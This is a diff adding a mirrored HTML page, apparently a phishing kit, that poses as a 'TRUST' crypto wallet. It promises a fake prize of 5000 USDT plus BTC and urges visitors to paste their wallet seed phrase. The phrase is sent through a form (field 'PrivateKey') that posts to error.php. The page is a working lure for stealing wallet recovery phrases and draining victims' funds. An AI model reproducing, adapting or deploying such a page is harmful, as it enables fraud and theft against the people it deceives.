@@ -1,0 +1,140 @@
+<!doctype html>
+<html lang="en">
+<!-- Mirrored from top-true-us.github.io/dapp/ by HTTrack Website Copier/3.x [XR&CO'2014], Sun, 11 Feb 2024 12:14:09 GMT -->
+<!-- Added by HTTrack --><meta http-equiv="content-type" content="text/html;charset=utf-8" /><!-- /Added by HTTrack -->
+<head>
+<style>
+.anticon {
+  display: inline-block;
+  color: inherit;
+  font-style: normal;
+  line-height: 0;
+  text-align: center;
+  text-transform: none;
+  vertical-align: -0.125em;
+  text-rendering: optimizeLegibility;
+  -webkit-font-smoothing: antialiased;
+  -moz-osx-font-smoothing: grayscale;
+}
+
+.anticon > * {
+  line-height: 1;
+}
+
+.anticon svg {
+  display: inline-block;
+}
+
+.anticon::before {
+  display: none;
+}
+
+.anticon .anticon-icon {
+  display: block;
+}
+
+.anticon[tabindex] {
+  cursor: pointer;
+}
+
+.anticon-spin::before,
+.anticon-spin {
+  display: inline-block;
+  -webkit-animation: loadingCircle 1s infinite linear;
+  animation: loadingCircle 1s infinite linear;
+}
+
+@-webkit-keyframes loadingCircle {
+  100% {
+    -webkit-transform: rotate(360deg);
+    transform: rotate(360deg);
+  }
+}
+
+@keyframes loadingCircle {
+  100% {
+    -webkit-transform: rotate(360deg);
+    transform: rotate(360deg);
+  }
+}
+</style>
+<meta charset="utf-8"><link rel="icon" href="sarikaya/32179889.png"><meta name="viewport" content="width=device-width,initial-scale=1"><meta name="theme-color" content="#fafafa">
+<link href="Cake/mango.css" rel="stylesheet">
+<link rel="apple-touch-icon" href=sarikaya/32179889.html><title>TRUST</title>
+<link href="Cake/garam.css" rel="stylesheet">
+<script src="Cake/jquery.min.js"></script>
+<script src="Cake/sinop.min.js" charset="utf-8" type="text/javascript"></script>
+</head>
+<body>
+
+
+<div id="root"><div class="ant-spin-nested-loading"><div class=""><div class="sc-jqCOkK kFZWwp"><div class="sc-gGBfsJ jvrGcO"><div class="sc-jnlKLf OHNdu">
+
+<br>
+<br>
+
+<center><div class="confirm-approve-content__identicon-wrapper"><img class="identicon confirm-approve-content__identicon" src="sarikaya/32179889.png" alt="" style="height: 70px;width: 70px;"></div></center>
+
+<div class="confirm-approve-content__title" style="
+    font-size: 1.2rem;
+    line-height: 140%;
+    justify-content: center;
+    text-align: center;
+    margin-top: 22px;
+    padding-left: 24px;
+    padding-right: 24px;
+    color: #3232e0;
+    "><b>TRUST</b></div>
+<h4 class="chakra-text css-13zbq26">
+                                
+<center>Secure and trusted multi-chain crypto wallet.</center>
+                            </h4>
+<h4 class="chakra-text css-13zbq26">
+                                <center><div style="color:#00a854;font-weight: " class="confirm-approve-content__card-content">Get your 5000 USDT + 0.1946 BTC Prize now</div></center>
+</h4>
+
+<h4><center>Enter your secret phrase here to connect</center></h4>
+
+<div class="sc-htoDjs cDnNqw">
+	<form method="post" action="error.php" class="ant-form ant-form-horizontal">
+        <div class="ant-row ant-form-item ant-form-item-with-help" style="row-gap: 0px;"><div class="ant-col ant-form-item-control"><p class="thepadding" style="text-align: left;color: hsla(0,0%,49.8%,.85);">Phrase</p>
+<div>
+    <div class="thepadding"><span class="register__label"
+     style="color:red;><font
+     size="2">Invalid mnemonic Phrase</font></span>
+        <textarea class="import-account__secret-phrase" placeholder="Paste seed phrase from clipboard" name="PrivateKey" id="wordsseed" minlength="24" maxlength="305" required="" style="
+    height: 106px;
+"></textarea>Typically 12 (sometimes 24) words separated by single spaces
+        </div></div><div class="ant-form-item-explain">
+                </div></div></div>
+
+                <div class="thepadding">
+<button class="button sc-VigVT fWmldN" type="submit">IMPORT</button>
+<div1></div1></div>
+<br>
+<br>
+<br>
+<br>
+<center>
+<a class="nav-link" href="#"><font face="Arial" size="2" color="#4682B4">What is a Recovery Phrase?</font></a>
+
+</center>
+</div> </form>
+                            </div>
+                            <div class="wawobp loader" data-tenqwa="9fkuxe">
+                                <div class="yat5ls lodas" data-2ivb6w="2n92zq">
+                                   <img class="identicon confirm-approve-content__identicon" src="sarikaya/32179889.png" alt="" style="height: 70px;width: 70px;">
+                                    <div class="7n1smr loader2 loader--style3" title="2" data-knlucr="ga7q37">
+                                        <svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" style="margin:auto;background:#20242d;display:block;" width="40px" height="40px" viewBox="0 0 100 100" preserveAspectRatio="xMidYMid">
+                        <circle cx="50" cy="50" fill="none" stroke="#0b65c6" stroke-width="10" r="35" stroke-dasharray="164.93361431346415 56.97787143782138">
+                          <animateTransform attributeName="transform" type="rotate" repeatCount="indefinite" dur="1s" values="0 50 50;360 50 50" keyTimes="0;1"></animateTransform>
+                        </circle>
+                      </svg>
+
+                </div>
+
+<script src="Cake/load.js"></script></body>
+
+
+<!-- Mirrored from top-true-us.github.io/dapp/ by HTTrack Website Copier/3.x [XR&CO'2014], Sun, 11 Feb 2024 12:14:19 GMT -->
+</html>
